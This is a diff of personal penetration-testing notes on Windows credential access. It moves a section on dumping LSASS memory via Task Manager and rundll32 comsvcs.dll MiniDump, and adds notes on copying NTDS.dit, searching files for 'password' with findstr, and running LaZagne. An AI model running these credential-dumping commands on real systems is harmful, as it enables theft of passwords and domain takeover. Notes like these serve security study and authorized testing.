@@ -6,6 +6,28 @@ PS > .\RunasCs.exe $Username $Password $Command
 Command can be like `msfvenom reverse shell`
 # Processes
 Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
+## Dumping #lsass Process Memory
+### Using Task Manager (GUI)
+"Create Dump File" of Local Security Authority Process (LSAP) from Task Manager. It gets saved in `C:\Users\<user>\AppData\Local\Temp`. 
+
+`Task Manager` > `"Processes" tab` > `"Local Security Authority" Process` > `Select Create dump file`
+### Using `rundll32.exe`
+- On CMD:
+```powershell
+PS > tasklist /svc
+```
+- On Powershell: 
+```PowerShell
+PS > Get-Process lsass
+PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <destination> full
+```
+### Tools
+- [[pypykatz]]
+## Dumping NTDS.dit
+To copy `NTDS.dit` we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights, which can be checked with `net localgroup`
+### Tools
+- [[VSS]]
+- [[CrackMapExec#Dump NTDS.dit|CrackMapExec > Dump NTDS.dit]]
 # Services
 ## Service
 - Check all services with `sc query`
@@ -89,20 +111,13 @@ If not connected to domain, extract #SAM-registry-hive with [[reg.exe]]
 ![[reg.exe#Save registry]]
 
 ## Dumping LSA Secrets/SAM Remotely  ![[CrackMapExec#Dump LSA/SAM Remotely]] 
-## Dumping #lsass Process Memory
-### Using Task Manager (GUI)
-"Create Dump File" of Local Security Authority Process (LSAP) from Task Manager. It gets saved in `C:\Users\<user>\AppData\Local\Temp`. 
-
-`Task Manager` > `"Processes" tab` > `"Local Security Authority" Process` > `Select Create dump file`
-### Using `rundll32.exe`
-- On CMD:
-```powershell
-PS > tasklist /svc
+# Enumeration
+## Find Keywords
+```cmd-session
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
-- On Powershell: 
-```PowerShell
-PS > Get-Process lsass
-PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <destination> full
+## Tools
+- [[LaZagne]]
+```cmd-session
+> start lazagne.exe all
 ```
-#### Tools
-- [[pypykatz]]
